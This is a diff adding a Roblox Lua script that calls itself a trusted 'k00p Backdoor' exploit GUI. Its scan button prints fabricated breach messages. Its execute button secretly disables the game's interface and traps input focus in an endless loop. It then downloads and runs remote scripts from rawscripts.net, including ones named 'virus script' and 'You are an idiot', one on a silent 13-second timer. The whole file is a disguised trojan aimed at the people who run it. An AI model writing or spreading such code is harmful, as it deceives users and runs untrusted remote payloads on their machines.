@@ -1,0 +1,104 @@
+- k00ps Backdoor a Trusted Backdoor that Works in almost all Games.
+local LP = game:GetService("Players").LocalPlayer
+local SG = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
+local StarterGui = game:GetService("StarterGui")
+
+SG.Name = "k00p_Legacy"
+SG.DisplayOrder = 999 -- Forced to top layer
+SG.ResetOnSpawn = false
+
+local scanned = false
+
+-- 1. MAIN FRAME
+local Frame = Instance.new("Frame", SG)
+Frame.Size = UDim2.new(0, 520, 0, 380)
+Frame.Position = UDim2.new(0.5, -260, 0.5, -190)
+Frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)
+
+-- 2. SIDEBAR & TITLE
+local Sidebar = Instance.new("Frame", Frame)
+Sidebar.Size = UDim2.new(0, 130, 1, 0)
+Sidebar.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+Instance.new("UICorner", Sidebar).CornerRadius = UDim.new(0, 8)
+
+local Title = Instance.new("TextLabel", Frame)
+Title.Size = UDim2.new(0, 300, 0, 40)
+Title.Position = UDim2.new(0, 145, 0, 10)
+Title.Text = "k00p Backdoor"
+Title.TextColor3 = Color3.fromRGB(0, 255, 0)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.Code; Title.TextSize = 28; Title.TextXAlignment = Enum.TextXAlignment.Left
+
+local Subtitle = Instance.new("TextLabel", Frame)
+Subtitle.Size = UDim2.new(0, 300, 0, 20)
+Subtitle.Position = UDim2.new(0, 147, 0, 45)
+Subtitle.Text = "Trusted by the Exploit Community."
+Subtitle.TextColor3 = Color3.fromRGB(120, 120, 120)
+Subtitle.BackgroundTransparency = 1
+Subtitle.Font = Enum.Font.SourceSans; Subtitle.TextSize = 12; Subtitle.TextXAlignment = Enum.TextXAlignment.Left
+
+-- 3. CONSOLE BOX
+local Console = Instance.new("ScrollingFrame", Frame)
+Console.Size = UDim2.new(0, 360, 0, 210); Console.Position = UDim2.new(0, 145, 0, 80); Console.BackgroundColor3 = Color3.fromRGB(5, 5, 5); Instance.new("UICorner", Console).CornerRadius = UDim.new(0, 4)
+
+local function log(text, color)
+    local l = Instance.new("TextLabel", Console); l.Size = UDim2.new(1, -10, 0, 18); l.Position = UDim2.new(0, 5, 0, #Console:GetChildren() * 18 - 18); l.Text = "> " .. text; l.TextColor3 = color or Color3.fromRGB(0, 255, 0); l.BackgroundTransparency = 1; l.Font = Enum.Font.Code; l.TextSize = 12; l.TextXAlignment = Enum.TextXAlignment.Left; Console.CanvasSize = UDim2.new(0, 0, 0, #Console:GetChildren() * 18)
+end
+
+-- 4. INPUT BOX
+local Input = Instance.new("TextBox", Frame)
+Input.Size = UDim2.new(0, 360, 0, 40); Input.Position = UDim2.new(0, 145, 0, 310); Input.BackgroundColor3 = Color3.fromRGB(20, 20, 20); Input.TextColor3 = Color3.new(1, 1, 1); Input.Font = Enum.Font.Code; Input.TextSize = 14; Input.Text = "Execute here"; Input.ClearTextOnFocus = true; Instance.new("UICorner", Input).CornerRadius = UDim.new(0, 6)
+
+-- 5. BUTTON CREATOR
+local function createBtn(name, pos)
+    local b = Instance.new("TextButton", Sidebar); b.Size = UDim2.new(0.8, 0, 0, 35); b.Position = UDim2.new(0.1, 0, 0, 80 + (pos * 45)); b.Text = name; b.BackgroundColor3 = Color3.fromRGB(25, 25, 25); b.TextColor3 = Color3.new(1, 1, 1); b.Font = Enum.Font.SourceSansBold; b.TextSize = 14; Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4); return b
+end
+
+local ScanBtn = createBtn("Scan", 0)
+local ClearBtn = createBtn("Clear", 1)
+local ExecBtn = createBtn("Execute", 2)
+
+-- 6. SCAN LOGIC
+ScanBtn.MouseButton1Click:Connect(function() 
+    log("k00p backdoor Initialized"); task.wait(1.2)
+    log("Scanning Remotes for any vulnerable gateways"); task.wait(2.5)
+    log("Found " .. math.random(50, 500) .. " Gateways."); task.wait(0.5)
+    log("HOOKING_DATA_STREAM: [SUCCESS]", Color3.fromRGB(0, 150, 255))
+    log("BYPASSING_AUTH_LAYER: [OK]", Color3.fromRGB(0, 150, 255))
+    log("INJECTING_ROOT_ACCESS: 0x"..math.random(1000, 9999), Color3.fromRGB(255, 165, 0))
+    log("SYSTEM_BREACH: [COMPLETE]", Color3.fromRGB(255, 0, 0))
+    scanned = true
+end)
+
+ClearBtn.MouseButton1Click:Connect(function() 
+    for _, v in pairs(Console:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end 
+end)
+
+-- 7. EXECUTION & TRAP
+ExecBtn.MouseButton1Click:Connect(function() 
+    if not scanned then log("Scan first.", Color3.new(1,0,0)) return end
+    
+    Frame.Draggable = false
+    log("Injecting....", Color3.fromRGB(0, 255, 0)); task.wait(3)
+    log("Success!", Color3.fromRGB(0, 255, 0)); task.wait(2)
+    
+    -- LOCKDOWN PROTOCOL
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    task.spawn(function()
+        while true do Input:CaptureFocus() task.wait() end
+    end)
+    
+    -- RUN INITIAL SCRIPTS
+    task.spawn(function() pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-The-virus-script-31230"))() end) end)
+    task.spawn(function() pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-You-are-an-idiot-112099"))() end) end)
+
+    -- INTERNAL 13 SECOND TIMER (SILENT)
+    task.spawn(function()
+        task.wait(13)
+        pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/you-are-an-idiot-hahahaha-haha-25038"))() end)
+    end)
+end)
